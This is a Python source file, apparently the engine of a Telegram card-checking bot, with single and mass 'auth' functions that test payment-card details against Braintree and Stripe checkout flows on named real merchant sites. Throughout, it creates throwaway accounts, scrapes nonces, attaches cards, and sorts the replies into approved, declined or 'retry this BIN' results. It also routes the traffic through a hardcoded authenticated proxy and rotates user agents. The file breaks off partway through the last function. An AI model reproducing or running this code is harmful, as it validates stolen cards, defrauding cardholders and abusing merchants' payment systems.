import re
import time
import requests
import json
import random
import string
import user_agent
from user_agent import generate_user_agent
from faker import Faker
import random
from bs4 import BeautifulSoup
import base64
import os
import sys
import random
import time
import string
import requests
import json
import base64
import re
from bs4 import BeautifulSoup
from telebot import types
import telebot
from colorama import Fore
from getuseragent import UserAgent
import user_agent
import pyfiglet
import webbrowser
import threading

acc = None

def generate_random_account():
    global acc 
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    acc = f"{name}{number}@gmail.com"  
    return acc

def generate_emails_periodically():
    while True:
        generate_random_account()
        #print(acc)
        time.sleep(0.1)

thread = threading.Thread(target=generate_emails_periodically)
thread.start()

########### B3 AUTH 1 /chk ###########
		
def dexter(cx):
    cx = cx.strip()
    n, mm, yy, cvc = cx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
    
    time.sleep(5)
    acc = [
        '0b-retiorchestral@hidmail.org', 
        'prep-bandleader-0e@hidmail.org', 
        'typical.08-intimac@hidmail.org', 
        '0z_nightinga.dirty@hidmail.org', 
        'harshopok1@gmail.com', 
        'harshopok49@gmail.com', 
        'inept.0y_pedal@hidmail.org',
        '07triple.neutron@hidmail.org', 
        'guide-completed.0x@hidmail.org', 
        '08snip.furry@hidmail.org'
    ]
    
    time.sleep(5)
    email = random.choice(acc)
    print(email)
    
    user = user_agent.generate_user_agent()
    r = requests.session()

    proxy = {
        "http": "http://sldgapyq:z8t48aV0lC@us8.cactussstp.com:3129",
        "https": "http://sldgapyq:z8t48aV0lC@us8.cactussstp.com:3129"
    }
    r.proxies.update(proxy)

    headers = {'user-agent': user}
    
    response = r.post('https://www.fishhuntshoot.com/my-account/add-payment-method/', headers=headers)
    nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1)
    
    data = {
        'username': email,
        'password': 'DEXTER@FFX@07',
        'woocommerce-login-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'login': 'Log in',
    }
    
    response = r.post(
        'https://www.fishhuntshoot.com/my-account/add-payment-method/',
        cookies=r.cookies,
        headers=headers,
        data=data,
    )
    
    nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)[0]
    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
    dec = base64.b64decode(enc).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
    nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
    
    time.sleep(9)
    print(nonce)
    
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://www.fishhuntshoot.com',
        'referer': 'https://www.fishhuntshoot.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': ''.join(random.choice('0123456789abcdef') for i in range(32)),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': '10080',
                        'streetAddress': '323 E Pine St Dex',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    id = response.json()['data']['tokenizeCreditCard']['token']
    print(id)
    
    headers = {'user-agent': user}
    
    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': id,
        'braintree_cc_device_data': '{"device_session_id":"da50ea157ef332fa94fd99997de2e239","fraud_merchant_id":null,"correlation_id":"27695fbc-4541-4d7a-a555-ac32bd40"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/mt6frmnwdvsw3q2k/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/mt6frmnwdvsw3q2k"},"merchantId":"mt6frmnwdvsw3q2k","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"mt6frmnwdvsw3q2k","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Fish Hunt Shoot","clientId":"AU5Uy080jyCEq419l-3AT030IprE3_CuVo2dH9g0fGmLLCC1E4PYJosH6VxvgTiIauzF8tr_JiIERYWS","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"fishhuntshoot_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
        'woocommerce-add-payment-method-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    
    response = r.post('https://www.fishhuntshoot.com/my-account/add-payment-method/', headers=headers, data=data)
    
    text = response.text
    pattern = r'Reason: (.+?)\s*</li>'
    match = re.search(pattern, text)
    
    if match:
        result = match.group(1)
    else:
        if 'Payment method successfully added.' in text:
            result = "1000: Approved"
        elif 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
        elif 'Card Not Activated' in text:
            result = "Card Not Activated."
        elif 'Please wait for 20 seconds.' in text:
            result = "Max Request Reached Try After 25 Seconds."
        else:
            result = "Error"

    result = re.sub(r'<.*?>', '', result).strip()
    
    if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
        return result
    else:
        return result
        
       
############B3 AUTH 1 - MASS ########₹

def dexters(cx):
    cx = cx.strip()
    n, mm, yy, cvc = cx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
    
    time.sleep(5)
    acc = [
    'hajjs@ahtiii.tech', 
    'gajanw@ahtiii.tech', 
    'hehjelq@ahtiii.tech', 
    'gwhjwnm@ahtiii.tech', 
    'owlosks@ahtiii.tech', 
    'hannalqp@ahtiii.tech', 
    'vanna@ahtiii.tech',
    'csbsn@ahtiii.tech', 
    'hansn@ahtiii.tech', 
    'hanan@ahtiii.tech'
]
    
    time.sleep(5)
    email = random.choice(acc)
    print(email)
    
    user = user_agent.generate_user_agent()
    r = requests.session()

    # Add proxy configuration
    proxy = {
        "http": "http://sldgapyq:z8t48aV0lC@us8.cactussstp.com:3129",
        "https": "http://sldgapyq:z8t48aV0lC@us8.cactussstp.com:3129"
    }
    r.proxies.update(proxy)

    headers = {'user-agent': user}
    
    response = r.post(
        'https://www.fishhuntshoot.com/my-account/add-payment-method/', headers=headers)
    nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1)
    
    data = {
        'username': email,
        'password': 'DEXTER@FFX@07',
        'woocommerce-login-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'login': 'Log in',
    }
    
    response = r.post(
        'https://www.fishhuntshoot.com/my-account/add-payment-method/',
        cookies=r.cookies,
        headers=headers,
        data=data,
    )
    
    nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)[0]
    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
    dec = base64.b64decode(enc).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
    nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
    
    time.sleep(9)
    print(nonce)
    
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://www.fishhuntshoot.com',
        'referer': 'https://www.fishhuntshoot.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': ''.join(random.choice('0123456789abcdef') for i in range(32)),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': '10080',
                        'streetAddress': '323 E Pine St Dex',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    id = response.json()['data']['tokenizeCreditCard']['token']
    print(id)
    
    headers = {'user-agent': user}
    
    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': id,
        'braintree_cc_device_data': '{"device_session_id":"da50ea157ef332fa94fd99997de2e239","fraud_merchant_id":null,"correlation_id":"27695fbc-4541-4d7a-a555-ac32bd40"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/mt6frmnwdvsw3q2k/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/mt6frmnwdvsw3q2k"},"merchantId":"mt6frmnwdvsw3q2k","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"mt6frmnwdvsw3q2k","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Fish Hunt Shoot","clientId":"AU5Uy080jyCEq419l-3AT030IprE3_CuVo2dH9g0fGmLLCC1E4PYJosH6VxvgTiIauzF8tr_JiIERYWS","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"fishhuntshoot_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
        'woocommerce-add-payment-method-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    
    response = r.post('https://www.fishhuntshoot.com/my-account/add-payment-method/', headers=headers, data=data)
    
    text = response.text
    pattern = r'Reason: (.+?)\s*</li>'
    match = re.search(pattern, text)
    
    if match:
        result = match.group(1)
    else:
        if 'Payment method successfully added.' in text:
            result = "1000: Approved"
        elif 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
        elif 'Card Not Activated' in text:
        	result = "Card Not Activated."
        elif 'Please wait for 20 seconds.' in text:
            result = "Max Request Reached Try After 25 Seconds."
        else:
            result = "Error"
    
    if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
        return result
    else:
        return result
        
        
########Stripe Auth 1 - /sa #############
        
def stripea1(ccx):
    import requests
    import names
    import random
    import string
    from user_agent import generate_user_agent
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")
    n = ' '.join([n[i:i+4] for i in range(0, len(n), 4)])
    mm = mm.zfill(2)
    
    if "20" in yy:
        yy = yy.split("20")[1]
        
    user = generate_user_agent()
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{username}@gmail.com"
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    
    headers = {
        'authority': 'api.kolekto.io',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.kolekto.io',
        'referer': 'https://www.kolekto.io/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }
    
    json_data = {
        'forename': first_name,
        'surname': last_name,
        'email': email,
        'password': 'DEXTER@FFX@07',
        'password2': 'DEXTER@FFX@07',
        'plan': 1,
        'card_name': f'{first_name} {last_name}',
        'card_number': n,
        'card_expire_month': mm,
        'card_expire_year': yy,
        'card_cvc': cvc,
    }
    
    proxy = {
        "http": "http://sldgapyq:z8t48aV0lC@us8.cactussstp.com:3129",
        "https": "http://sldgapyq:z8t48aV0lC@us8.cactussstp.com:3129"
    }
    
    response = requests.post('https://api.kolekto.io/users/', headers=headers, json=json_data, proxies=proxy)
    print(response.text)
    if "uuid" in response.text:
        return "Thank you for your purchase!"
    elif "Your card was declined." in response.text:
        return "Your card was declined."
    elif "Payment method has expired." in response.text:
        return "Your card was declined."
    elif "Your card number is incorrect." in response.text:
        return "Your card number is incorrect."   
    elif "Your card does not support this type of purchase." in response.text:
        return "Your card does not support this type of purchase."
    else:
        return "Unknown Response"
        
        
########Stripe Auth 1 - Mass #############
        
def stripem1(ccx):
    import requests
    import names
    import random
    import string
    from user_agent import generate_user_agent
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")
    n = ' '.join([n[i:i+4] for i in range(0, len(n), 4)])
    mm = mm.zfill(2)
    
    if "20" in yy:
        yy = yy.split("20")[1]
        
    user = generate_user_agent()
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    print(username)
    email = f"{username}@gmail.com"
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    
    headers = {
        'authority': 'api.kolekto.io',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.kolekto.io',
        'referer': 'https://www.kolekto.io/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }
    
    json_data = {
        'forename': first_name,
        'surname': last_name,
        'email': email,
        'password': 'DEXTER@FFX@07',
        'password2': 'DEXTER@FFX@07',
        'plan': 1,
        'card_name': f'{first_name} {last_name}',
        'card_number': n,
        'card_expire_month': mm,
        'card_expire_year': yy,
        'card_cvc': cvc,
    }
    
    proxy = {
        "http": "http://sldgapyq:z8t48aV0lC@us8.cactussstp.com:3129",
        "https": "http://sldgapyq:z8t48aV0lC@us8.cactussstp.com:3129"
    }
    
    response = requests.post('https://api.kolekto.io/users/', headers=headers, json=json_data, proxies=proxy)
    print(response.text)
    if "uuid" in response.text:
        return "Thank you for your purchase!"
    elif "Your card was declined." in response.text:
        return "Your card was declined."
    elif "Payment method has expired." in response.text:
        return "Your card was declined."
    elif "Your card number is incorrect." in response.text:
        return "Your card number is incorrect."   
    elif "Your card does not support this type of purchase." in response.text:
        return "Your card does not support this type of purchase."
    else:
        return "Unknown Response"
	
############## stripe2 auth - single #######

def stripea2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
	    'user-agent': user,
	}
	
	data = {
	    'email': acc,
	    'password': 'ASDzxc#123#',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_session_entry': 'https://purpleprofessionalitalia.it/my-account/',
	    'wc_order_attribution_session_start_time': '2024-10-30 10:14:15',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'mailchimp_woocommerce_newsletter': '1',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Registrati',
	}
	
	response = r.post('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'user-agent': user,
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=dexterffxservices%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=832aee5d-eb81-4b59-9627-4b0e0f5da669d4c6aa&muid=ce1ff88d-2ccf-44b4-87e6-cd039fa22e9bfe0826&sid=d1996f06-22cc-4129-adc1-770bd26ded72c51435&payment_user_agent=stripe.js%2F08a843aa09%3B+stripe-js-v3%2F08a843aa09%3B+split-card-element&referrer=https%3A%2F%2Fpurpleprofessionalitalia.it&time_on_page=19633&key=pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoidWt6Q3JpaWRGb0VzSWtrRGppTXJnVEFYQjgvL1lWZlNOTjEzM2xkVzFhN0ZnVC83VWRHMThTcU0wR1dQRHoyWW9LdlJvTm5aWkFFSkZONFpkM3djRlF0OERQeVl6UWdnYU56S1NOcGxjNWZ6NkFNYXk4WW1NalNkUW1CZ2djQnB0TU9nT2JIV3c5L1FhdldDaCtxbHJnVnB0SDBtR3QrWXhHeWtuU1dacW1BREZmc3JLMFhOcXgyMlc3U25IcTN5YzFrS3h6UGZ1a1lvNWQvYzlXRlZxdTI1N0dkNWFJUDh2N3dtMXdPU2JtTHZJRzM2MHRqdEgwcUlPVWptM2NMUUJYWDJWd09FODVvcCtZUmtzMHVON2N2MWJ1dElJclF5ZUcwRTJJU3BuNExwSU5hRy94Ym9EaHNQVGpRSmdadXB1U2FLcVl0QS9qemJ4d2pqRWkvcStnV3N4SHFKNFV4eHBkOUxXZ29uSmVraFpYZGNNdXFtYUR4dDFodVZUaXI2SUl0dmZoTUt0blAyZWNuM0FXTzJ6N25QeHdnaHVXMWkramIvN05na3d3eDRUZlNqSW0xVnBpaTAzZEFsVUhIampGaHFMY25XcDBwZUdGeWFXZ1lNeVZxMEFMZjYwT1JubzJXb2hUWXo5M3VodDd1dGpyVjhCbUgyVGhPRlVKQ2h3SXVnVmF3amo2d0hyZHU5VmhhY3ByZml5bGpEd0NzRW1mbVQycmV1L01pN0pKdTJuTVg0aVg3Q00wdHkxanBLQmtQUjZya2tPNXZhdjhWVC9OZGxWRXFVU2NTb1hZWlB5TFcrYlVxOFBrK0tLWUVpaTRmdmZ1TkwxeVR3UG5kRlE4ZXZLRzNkUU1vckMvRGRaZDByMmtSa0ZkT1JxMzIvQkN2T01OY0YrbEM5blhBZ3lMQWhPbTN5QUdwTGE0TzIrUmVGeGxzNVFwVit0NS9rUzJJUE1ENjhwUlR5YW5ielhnNjRpSFJTSEI3ZmlkWEJISFFQZVNmVlhaZ3BHeVBHTVhVaE5EZ3cvdUpGc3pHS3NHRjFYTE1pNE5ycWVYYzkvMUZBTWh4aDZNclBYM3ZCZDlycWxYVy9EOVg0b2VHSkdneUNXVVRBZVlnQ1N5aHNmSDBzdEpvbytnRko4VDhZTmw0OW5VL2p3SGh4KzNwNU9EZk52dlVMcnpRbk02OVQzTld0aXFzbE10ZXNNS2w0VmxOWHlZTk14VCtMZWNTSXcwbjJtV3dCMVlTZ0s1NElwWEQ1VUpjTWZZYTd4elhwVENMY1BCcklsejZJbEZXM2xiTHFqSnYwRXYwYzBySzhOdnVEbkM5QmlZMFpjdkFXOGg1MHdXSTdzLzhDMjJheUNYUk5KME5vcVkzY1JodTFGVnJoVDU4LzBncGNqU0RQalF3SVJJVm4wTFN6QjZzWUJodXVBNnE5c0R6YXhkM0RyMTlPM09vOTFPMHo2WEo1VUZFVjVma2dQcEliZTRpZnJBdzlOa1o1U3FkaXpWSDhNd1RPN3NvK2szNG5xQ1dLd25nTlJSWmhlM25KNHlJZlVndHJBM3lvZEh3REU0UkRuMU1pcFBOaHo5dWdNeDRETjFrN0tyMjNvMWYzWFE4d1ZSWENmbllITXFaZEhoUEtZU0JZSlhWenB4WmF4eGFVa3BmTis4RXRPbFhISkN3WXNXdTZCL1FrNmJCMHFJVTlzSTFkS0lnZkRjUThFcDJ4Y242QnA5RGR0WThzclR6blZwOWlhZUx3TEFndVlyWEpZU3ZGUEUvak5peDltbVlEZG8rbXRhZGpFUkFiSHNkY1NtVkRuWW9oalpzekZ4U1VtNUNjR1NBV1NLbHJIL0xuNTR5ZUl4dU01akpGQmc4ZDVWUXgva0NQQUIzUWpUWnRsMDZQWDVVYUVzMHRxN1FLUmNrWkNDdHpIeSt0Q2QvS1Y1dE5ZZzJwdExpT3lObWFNNG1vZDloUFpLZjgyL1lqZUJRQUM2SHFZdG5Xb1dSeUcxS1BjcXYyZ1ZKWnVUTTEzWnpMdG4rVHllU1hSQnA5MXJsWkg1SUxmN3FsWkRPcjRsM2sxKzRkWXpWSURnN0VlN09uWHdXT09MUDVGdVVoNkhmT0JnZW8wZkRpYS9JZHlZNlB4RmNHZVFIdW1Ca3Y1S0ZsUFFOdy9pTXlnM1BzZ3hIakpsWlFZMysrelFLRzBhbWJkMm5acjIyU1JHdUxxbXlLRDNBdGtsNmhjU2t2anlhTkdhSzBKc3hyaTJMckhxYyszQWFBQjJWVWFUeXRUaGFQekNkeUdya3dZVG1NbUxwdktMdDRiNzd1SUU3anpJVFNsYS9EZW5Hd09NTUZMZEhxYllhUzFIeXVNcUNOdkRZQlBqS0JRZGFqSmp1b3gyb1ArNlhSWnpkQXk3QklBSm5tSzNIVTdGU3dRUitJTGdpS1VRWjZ1QXVpK1ZtSXlHTGxLMVJQa2Y5Zmt3d0NrWGxuRzdydE91RG1KSlRvMGlPMXpoOWFQRGJSTFN6ZXNkSmIzcjZIa3c5eTYweGNMS0lQTXRFeVdrbC9XNFNCWm5DTkQwcnd2SGV1TjJmRmxXc2QzbzczRHM1Ry9CN3JHYk80QVRabFMrVFNpNVhNb09rTHNzNWEvY3hHOWxlRnhwMVVkZGRzdktUWnhyR0FqK1pOWWN0bytPbmcyN3NqOTZvMVVCS0RNWkUxS290ZUJZZjg1c3NnSmVuWWxmMjMxTG51Q0FLR1VXU0h1Yi9pQThOMWxSb1IyRzRJdVpjTDA3ODYxdjNOWGdmMG9wVGFiZ2ovTE13UGk0eTBhdDd5YjRDc20zbjlaMG5Na1pqR0k1ckdMbWx0b3Y4YVdOck84Y2l5bU8xUkZ6clQwRHJUL0dreDFGczIvaEZRZzJjWVJGU0luelV2WEE9PSIsImV4cCI6MTczMDI5NDAxNSwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiIyNzMzMTdlMiIsInBkIjowLCJjZGF0YSI6IklML1FRUTNpUlFqM3pnQmpadkE2RXBNeFBZb2Rrc2hXc1BQL0wwTVFGc09wa2xjRVBpOEhFVGVpWU9TSGF0WWtDWUdFZ0RmdkR3aDhXcU9mTW1jUkxQd0xqbXo1K2gwMWhCZmY0QXBJK3paU2tSckNJbzgvcGZ3cW5iNEZsWFEzeHBaRkx6b0xGOUUzMW1oNm96dThzTDJIK2FvMThoK3BCVEh0YTFqbm81S2hBQ3BhZDNMckVSdWNoZjlSMkl0c1JNWHRsTHNKWmJ6TnVFanQifQ.La0fl18SzslzpEwAWrr3FfAclH2fBS_0Sde_064_Hsk'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		return "Invalid Credit Card ❌"
	else:
		id=response.json()['id']
	
	headers = {
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = r.post('https://purpleprofessionalitalia.it/', params=params, cookies=r.cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'success' in text:
			result = "success"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Your card was Declined."
		if 'avs' in result:
			return 'Invalid Billing Address: Avs'
		elif 'success' in result:
			return 'Nice! New payment method added.'
		elif 'Duplicate' in result:
			return 'Nice! New payment method added.'
		elif 'Insufficient Funds' in result:
			return 'Insufficient Funds'
		else:
			return result


############ stripe Auth 2 - Mass ##########		

def stripem2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
	    'user-agent': user,
	}
	
	data = {
	    'email': acc,
	    'password': 'ASDzxc#123#',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_session_entry': 'https://purpleprofessionalitalia.it/my-account/',
	    'wc_order_attribution_session_start_time': '2024-10-30 10:14:15',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'mailchimp_woocommerce_newsletter': '1',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Registrati',
	}
	
	response = r.post('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'user-agent': user,
	}
	
